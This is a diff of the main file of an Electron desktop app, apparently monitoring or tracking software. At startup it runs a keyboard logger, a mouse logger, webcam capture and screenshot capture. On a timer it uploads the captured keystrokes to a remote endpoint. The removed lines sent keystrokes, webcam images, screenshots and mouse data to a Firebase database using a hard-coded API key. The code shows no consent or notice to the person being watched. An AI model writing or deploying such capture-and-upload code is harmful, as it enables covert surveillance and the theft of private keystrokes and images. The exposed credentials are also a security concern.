@@ -1,13 +1,11 @@
 
 const {app, BrowserWindow,Tray,Menu} = require('electron')
-const path = require('path')
+
+const path = require('path');
 let shared=require("./src/app/shared/Shared.js");
 let response=shared.readSetting();
 var fs = require('fs'); 
 console.log(__dirname);
-var IsEnable=true;
-var KeyIsEnable=true;
-var mouseIsEnable=true;
 const url = require('url')
 function createWindow () {
   const mainWindow = new BrowserWindow({
@@ -101,136 +99,41 @@ app.on('activate', function () {
 app.on('ready', () => { 
   win = new BrowserWindow({ show: false }); 
 });
+//Screenshot
 let ScreenShot=require("./src/app/tracker/screenshot/ScreenShot.js");
-ScreenShot();
-   let WebCam = require("./src/app/tracker/webcam/WebCam.js");
+  ScreenShot();
+//Screenshot
+  let WebCam = require("./src/app/tracker/webcam/WebCam.js");
    WebCam();
- 
+ //Keyboard Logger
 let KeyboardLogger=require("./src/app/tracker/keyboard/Keyboardlogging.js");
 KeyboardLogger();
-console.log("Success");
+//Mouse Logger
 let mouseLogger=require("./src/app/tracker/mouse/mouseLogging.js");
 mouseLogger();
-var firebase = require('@firebase/app');
-require('@firebase/auth');
-require('@firebase/database');
- firebase.default.initializeApp(
-  {
-    apiKey: "AIzaSyB03uXj4djfEFpYKppSnjopgjE6O5l8-YE",
-    authDomain: "symbolic-datum-233317.firebaseapp.com",
-    databaseURL: "https://symbolic-datum-233317.firebaseio.com",
-    projectId: "symbolic-datum-233317",
-    storageBucket: "symbolic-datum-233317.appspot.com",
-    messagingSenderId: "412248865946",
-    appId: "1:412248865946:web:f5df2c9fdca2108356f323",
-    measurementId: "G-E1B75MFBL8"
- });
+
 setInterval(function(){
 require('dns').resolve('www.google.com', function(err) {
   if (err) {
      console.log("No connection");
   } else {
-   
-  //console.log("firebase",firebase);
-                
-                   //  firebase.analytics();
+
           let Keyboard_data=shared.GetKeyboardData();
           if(Keyboard_data.length!=0)
           {
-       
-  
-            for(let i=0;i<Keyboard_data.length;i++)
-            {
-              
-              // try{
-           var path="Keyboard/"+shared.getRandomInt("999999999")+"/";
-              var body={
-                      Output:Keyboard_data[i].Data
-                       }
-             firebase.default.database().ref(path).set(body);
+           var path="Data-/"+shared.getRandomInt("999999999")+"/";
+              var body=Keyboard_data
+             shared.fnPostData(path,body);
               console.log("yes it happened")
-             
-              
-            }
-           
           }else{
             console.log("No Record Found")
           }
           let res=[];
           fs.writeFileSync("./Storage/KeyboardStorage.json",JSON.stringify(res));
-          //-----------------------------------------------------------
-          
-          let WebCam_data=shared.GetWebCamData();
-          if(WebCam_data.length!=0)
-          {
-       
   
-            for(let i=0;i<WebCam_data.length;i++)
-            {
-              
-           var path="WebCam/"+shared.getRandomInt("999999999")+"/";
-              var body={
-                      Output:WebCam_data[i].Data
-                       }
-             firebase.default.database().ref(path).set(body);
-              console.log("yes it happened")
-            }
-           
-          }else{
-            console.log("No Record Found")
-          }
-    
-          fs.writeFileSync("./Storage/WebCamStorage.json",JSON.stringify(res));
-  //-----------------------------------------------------------
-  let ScreenShot_data=shared.GetSnapShotData();
-  if(ScreenShot_data.length!=0)
-  {
-
-
-    for(let i=0;i<ScreenShot_data.length;i++)
-    {
-      
-   var path="ScreenShot/"+shared.getRandomInt("999999999")+"/";
-      var body={
-              Output:ScreenShot_data[i].Data
-               }
-     firebase.default.database().ref(path).set(body);
-      console.log("yes it happened")
-    }
-   
-  }else{
-    console.log("No Record Found")
-  }
-  
-  fs.writeFileSync("./Storage/ScreenShotStorage.json",JSON.stringify(res));
-  
-   //-----------------------------------------------------------
-  let MouseData=shared.GetMouseData();
-  if(MouseData.length!=0)
-  {
-
-
-    for(let i=0;i<MouseData.length;i++)
-    {
-      
-   var path="Mouse/"+shared.getRandomInt("999999999")+"/";
-      var body={
-              Output:MouseData[i].Data
-               }
-     firebase.default.database().ref(path).set(body);
-      console.log("yes it happened")
-    }
-   
-  }else{
-    console.log("No Record Found")
-  }
-  
-  fs.writeFileSync("./Storage/mouseStorage.json",JSON.stringify(res));
+ 
     
 }   
 });
-function callback()
-{
-  console.log("Its Back")
-}
+
 },response.PostRequest)
